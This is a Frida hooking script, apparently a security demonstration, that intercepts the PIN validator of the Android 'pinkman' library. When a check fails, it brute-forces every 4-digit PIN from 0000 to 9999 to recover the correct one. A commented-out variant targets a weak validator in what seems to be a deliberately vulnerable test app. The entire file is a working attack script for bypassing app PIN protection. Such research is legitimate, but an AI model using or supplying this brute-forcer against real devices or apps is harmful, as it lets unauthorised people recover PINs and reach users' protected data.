console.log("[*] Hook is loaded");

Java.perform(function () {
    console.log("[*] Run instrumentation");

    var pinkman = Java.use("com.redmadrobot.pinkman.Pinkman");
    var pinString = Java.use("java.lang.String");

    pinkman.isValidPin.implementation = function (arg) {
        console.log("[*] Call isValidPin()");

        var ret = this.isValidPin(arg);

        if (!ret) {
            console.log("[*] Starting bruteforce...");
            for (var i = 0; i <= 9999; i++) {
                var pin = (i + 100000).toString().slice(-4);

                if (this.isValidPin(pinString.$new(pin))) {
                    console.log("[*] Found: " + pin);
                    break
                } else {
                    console.log("Try: " + pin)
                }
            }
        }

        return ret;
    }

    // Bruteforcer for a special weak version of a pin validator
    //
    // var validator = Java.use("com.redmadrobot.vulnerableapp.ui.input_pin.InputPinViewModel")
    //
    // validator.isValidPinWeak.implementation = function (arg) {
    //     console.log("[*] Call isValidPin()");
    //
    //     var ret = this.isValidPinWeak(arg);
    //
    //     if (!ret) {
    //         console.log("[*] Starting bruteforce...");
    //         for (var i = 0; i <= 9999; i++) {
    //             var pin = (i + 100000).toString().slice(-4);
    //
    //             if (this.isValidPinWeak(pin)) {
    //                 console.log("[*] Found: " + pin);
    //                 break
    //             } else {
    //                 console.log("Try: " + pin)
    //             }
    //         }
    //     }
    //
    //     return ret
    // }
});